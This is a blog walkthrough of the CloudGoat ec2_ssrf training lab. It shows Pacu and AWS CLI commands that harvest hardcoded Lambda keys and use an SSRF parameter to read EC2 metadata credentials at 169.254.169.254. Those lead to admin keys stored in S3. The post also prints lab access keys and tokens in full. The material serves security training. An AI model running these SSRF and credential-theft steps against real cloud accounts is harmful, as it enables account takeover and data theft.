---
layout: post
title: CloudGoat ec2_ssrf
date:   2019-09-26 12:00:00
categories: howto
permalink: "/howto/cloudgoat/ec2-ssrf"
---

## Introduction
For this post we're going to work through the fourth CloudGoat chllenge: ec2_ssrf 

This challenge can be found [here](https://github.com/RhinoSecurityLabs/cloudgoat/tree/master/scenarios/ec2_ssrf).

According to the documentation the goal for this challenge is:
```
Starting as the IAM user Solus, the attacker discovers they have ReadOnly permissions to a Lambda function, where 
hardcoded secrets lead them to an EC2 instance running a web application that is vulnerable to server-side request 
forgery (SSRF). After exploiting the vulnerable app and acquiring keys from the EC2 metadata service, the attacker 
gains access to a private S3 bucket with a set of keys that allow them to invoke the Lambda function and complete 
the scenario.
```
------ 

## Lets Begin
First we’ll validate the credentials
```
aws sts get-caller-identity
```
Create looks like we’re the solus user.

Running lambda__enum shows a function that we have access to
```
run lambda__enum --regions us-east-1
```
When we view the captured enumerated data with pacu
```
data
```
We see the following information:
```
Lambda: {
    "Functions": [
        {
            "FunctionName": "cg-lambda-cgid0aj9eyqxxk",
            "FunctionArn": "arn:aws:lambda:us-east-1:944882903810:function:cg-lambda-cgid0aj9eyqxxk",
            "Runtime": "python3.6",
            "Role": "arn:aws:iam::944882903810:role/cg-lambda-role-cgid0aj9eyqxxk-service-role",
            "Handler": "lambda.handler",
            "CodeSize": 223,
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2019-09-26T13:38:41.131+0000",
            "CodeSha256": "xt7bNZt3fzxtjSRjnuCKLV/dOnRCTVKM3D1u/BeK8zA=",
            "Version": "$LATEST",
            "Environment": {
                "Variables": {
                    "EC2_ACCESS_KEY_ID": "AKIA5X73I5MBAVBBMG5B",
                    "EC2_SECRET_KEY_ID": "zyZjvo6s4C+0TRYMUfSSP/h5ZVTo94bXlNAZd//q"
                }
            },
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "5052621d-9ab0-44a8-81fa-f2d0fdf4bc78",
            "Region": "us-east-1",
            "Code": {
                "RepositoryType": "S3",
                "Location": "https://prod-04-2014-tasks.s3.amazonaws.com/snapshots/944882903810/cg-lambda-cgid0aj9eyq
                             xxk-659a6627-2c01-4ce7-b935-905dec3e69f9?versionId=.Uj9IkNL29ghHk8EBxIk9zxP3FyhZfUP&X-Am
                             z-Security-Token=AgoJb3JpZ2luX2VjEIX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSJGMEQ
                             CIH8VXfYuJBM8GAobRjLyNkURAscIMs%2FfQeirURZHWiinAiB6KACxP2dRKy0TfwPWQqi0nqenb4FEtfX%2BKyz
                             1PsG07iraAwheEAAaDDc0OTY3ODkwMjgzOSIMkjBL3mflx6ZcADGrKrcDtYwKqJk6NjQWvHWIfweyBYlfPV27gPl
                             D45pkIAvwMS%2BJgVN13mh8eNS2lr8JP%2BJzsP8F6z3qRFF%2FVS9%2B9RHcRqVAbx2IcpFRI50yofX5hEkXZc4
                             KahyFm%2B7IrgCFvYwSy3AQxTi%2B9QnU%2F3iL7Bl3I0sck6XvDsgtkjq%2FGeC%2FPN82Nu92%2F%2Fe7fA1NJ
                             9BUFEPY6gUtzqcoh2wjoNeNT7OOd9aSSBKx5a0EZsnotM%2BDI7fCONL3gz6ttLlLUOfA2SiJYjS2st55VMi6IBa
                             CKo4NZrjMj3zztfjSsrnbp7HFEUtaIs695SCTTeMeP29LAkdc1d1E97zW1xTlaobXIsNAJuTQ22SmnCWkDZO%2BH
                             0TZBCkmXkDIjrAnfka7N3%2FqcGvHHs0SmW9TIKHZ4qCH9eDMGWHu948PHZvGlHCiv11RCmtPEg5j8p0eNGW1hzB
                             jbxVYz2RKHQ53cHRoRXY8SZub1NdglAwPsZAdy1BQyGXGpHkxLCCQh0gA7A5Eus4GBBRSJsXQdj22UVO%2BuDiTy
                             sIS0n68ZzzoY%2B8O8hqrt26zTPs6Rsl0U2lpzIsiJp9CQwPfEEd2BqZ9szDf7bLsBTq1ASRYKnl3krwcdL0yQUz
                             1fRY5pszD8yyZQjQUz0f4jouTdr%2Fzp2fBBUXKUzgEUCVUFi5wpHldOFDGP3vMbDH0SkdwHr%2BaQdD6LdkvFap
                             W78gTlLYPMEX2mF%2BgA4jO5tgLsqVYDzEs7L9EYW2J9fQGU%2B1RqJv8iiGjA%2F6oPex0ZSWjX0coCDaRuTny2
                             MhPtCeW3bjuMosPYtlqFCNFYroJR2aRo7JvlMRxwYCNkEcfDARGaC%2FOmN0%3D&X-Amz-Algorithm=AWS4-HMA
                             C-SHA256&X-Amz-Date=20190926T135120Z&X-Amz-SignedHeaders=host&X-Amz-Expires=600&X-Amz-Cr
                             edential=ASIA25DCYHY3X42O2HL7%2F20190926%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature
                             =093468450079b02b932d86b8a06eeae2bce113fb8902810e37ee96d0bd8992a5"
            },
            "Tags": {
                "Name": "cg-lambda-cgid0aj9eyqxxk"
            }
        }
    ],
```

Look Keys and code snapshot!

We’ll come back to those keys in a second, lets grab the Lambda function and see if there is anything juicy in the code. We can do this by copying the 'Location' link and making a request to that URL. We'll get a zipped version of the function.

```
def handler(event, context):
    # You need to invoke this function to win!
    return "You win!"```

Nothing of real interest here just the function that needs to be called to 'win' the challenge.

Lets add those keys discovered from the environment variables and see what they do:

```
aws sts get-caller-identity --profile souls-lambda```

Neat its a new user ‘wrex’

Lets use wrex to enumerate:
```
run lambda__enum —region us-east-1   #Fails no permissions
run iam__bruteforce_permissions    #Works 86 allow permissions found looks like everything is tied to an ec2```

Lets see what instances are running:

```
aws ec2 describe-instances --output table --profile wrex --region us-east-1```

Looks like there is 1 instance running. It has a public IP, and the security groups seem to allow ssh and internet access based on there names. Lets confirm that by first checking the ‘http’ group:

```
aws ec2 describe-security-groups --group-id sg-01ba15f6900fb29b5 --output table --profile wrex —region us-east-1```

The output shows that tcp 80 is allowed in to the instance. Lets check the ’ssh’ group

```
aws ec2 describe-security-groups --group-id  sg-0c7cb6af2ad26f721 --output table --profile wrex —region us-east-1```

Looks like we also have ssh access to the box. So, what’s running on this IP on port 80? Lets curl it!

```
curl http://ec2-54-85-35-195.compute-1.amazonaws.com```

Comes back with the response:

```
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>TypeError: URL must be a string, not undefined
 &nbsp; &nbsp;at new Needle (/node_modules/needle/lib/needle.js:156:11)
 &nbsp; &nbsp;at Function.module.exports.(anonymous function) [as get] (/node_modules/needle/lib/needle.js:785:12)
 &nbsp; &nbsp;at /home/ubuntu/app/ssrf-demo-app.js:32:12
 &nbsp; &nbsp;at Layer.handle [as handle_request] (/node_modules/express/lib/router/layer.js:95:5)
 &nbsp; &nbsp;at next (/node_modules/express/lib/router/route.js:137:13)
 &nbsp; &nbsp;at Route.dispatch (/node_modules/express/lib/router/route.js:112:3)
 &nbsp; &nbsp;at Layer.handle [as handle_request] (/node_modules/express/lib/router/layer.js:95:5)
 &nbsp; &nbsp;at /node_modules/express/lib/router/index.js:281:22
 &nbsp; &nbsp;at Function.process_params (/node_modules/express/lib/router/index.js:335:12)
 &nbsp; &nbsp;at next (/node_modules/express/lib/router/index.js:275:10)</pre>
</body>
</html>
```

Lets check the headers too:

```
curl -I http://ec2-54-85-35-195.compute-1.amazonaws.com
```

And the response is:
```
HTTP/1.1 500 Internal Server Error
X-Powered-By: Express
Content-Security-Policy: default-src 'none'
X-Content-Type-Options: nosniff
Content-Type: text/html; charset=utf-8
Content-Length: 1031
Date: Thu, 26 Sep 2019 14:20:00 GMT
Connection: keep-alive
```

Based on these results we can be certain there is a node app running here using the express webserver. Its directly on the Internet and not hidden behind a load balancer.

It also appears it is expecting a url parameter lets see if we can fuzz that with a couple of easy guesses:

```
http://ec2-54-85-35-195.compute-1.amazonaws.com?URL=asdf.com
http://ec2-54-85-35-195.compute-1.amazonaws.com?url=asdf.com
```

Success! The second request worked! We got a response back that wasn’t an error:
```
<h1>Welcome to sethsec's SSRF demo.</h1>
<h2>I am an application. I want to be useful, so I requested: <font color="red">asdf.com</font> for you
</h2>

<html>
  <head>
    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-3235813-1"></script> 
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'UA-3235813-1');
    </script>
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
    <title>asdf</title>
  </head>
  <body alink="#c0c000" bgcolor="#000000" link="#808080" text="#c0c0c0" vlink="#ffffff">
    <center>
      <img src="89asdf.gif" alt="asdf" height="324" width="432">
      <p>
      <font size="+2"><a href="aboutasdf.html">About</a> asdf</font>
      <p>
      <font size="+2">What is <a href="whatisasdf.html">asdf</a> ?</font>
      <p>
      <font size="+2">asdf <a href="//asdfforums.com">Forums</a></font>
      <p>
      <hr size="1" width="300">
      <p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- asdf ad -->
<ins class="adsbygoogle"
     style="display:inline-block;width:728px;height:90px"
     data-ad-client="ca-pub-5526145018929722"
     data-ad-slot="6999061358"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>
</center>
  </body>
</html>
```

So, since this is an exercise tied to aws lets point this ssrf in on its self and see what happens:
```
curl http://ec2-54-85-35-195.compute-1.amazonaws.com?url=http://169.254.169.254/
```

And the response:

```
<h1>Welcome to sethsec's SSRF demo.</h1>
<h2>I am an application. I want to be useful, so I requested: <font color="red">http://169.254.169.254/</font> for you
</h2>

1.0
2007-01-19
2007-03-01
2007-08-29
2007-10-10
2007-12-15
2008-02-01
2008-09-01
2009-04-04
2011-01-01
2011-05-01
2012-01-12
2014-02-25
2014-11-05
2015-10-20
2016-04-19
2016-06-30
2016-09-02
2018-03-28
2018-08-17
2018-09-24
latest
```

Awesome!! 

We can walk all around the meta-data:

```
curl http://ec2-54-85-35-195.compute-1.amazonaws.com?url=http://169.254.169.254/latest/meta-data/iam/info/
```

Looks like there is a profile associated with this:

```
{
  "Code" : "Success",
  "LastUpdated" : "2019-09-26T13:39:02Z",
  "InstanceProfileArn" : "arn:aws:iam::944882903810:instance-profile/cg-ec2-instance-profile-cgid0aj9eyqxxk",
  "InstanceProfileId" : "AIPA5X73I5MBF6BNYTDSF"
}
```

All good signs!

Lets see if we can find credentials!
```
curl http://ec2-54-85-35-195.compute-1.amazonaws.com?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-cgid0aj9eyqxxk/```

Boom, keys!

```
{
  "Code" : "Success",
  "LastUpdated" : "2019-09-26T13:38:42Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA5X73I5MBK5DG5SMA",
  "SecretAccessKey" : "i0i/UIiETrHbCZ6rnxc96avTMr9NHAL5aSGZb6V2",
  "Token" : "AgoJb3JpZ2luX2VjEIb//////////wEaCXVzLWVhc3QtMSJGMEQCIB0MPkK2gpMCcwIHR2w20WG",
  "Expiration" : "2019-09-26T20:13:50Z"
}```

Lets set these as another profile and see what we can do.

Dropping them into pacu they seem pretty limited, if we brute force 

```
run iam__bruteforce_permissions```

The only thing these credentials provide access to is s3.lets see what’s there. We’ll add the session to aws credentials and include the token with
aws_session_token

Now we can ls s3

```
aws s3 ls --profile ec2```

Interesting a bucket, with a file called admin-user.txt what’s in there?

```
cat admin-user.txt 
AKIA5X73I5MBL22TOFFD
mGJdldTovP4OIxSMUiodhdPyAjdbbTQTtxFt+piP```

Lets plug those into pacu/aws cli and see what we can do

```
aws configure —profile admin```

Validate they work:
```
aws get-caller-identity —profile admin```

Neat now we’re ’Shepard’ 

Set these keys in pacu and we can now run admin functions!

```
run aws__enum_spend
run aws__enum_account```

Knowing that we have full admin rights to this account we can now run the Lambda script:

```
aws lambda invoke --function-name cg-lambda-cgid0aj9eyqxxk --profile admin --region us-east-1 ./win.txt```

We run this and get a json response with StatusCode 200 and when we cat win.txt we are greeted with “You win!"

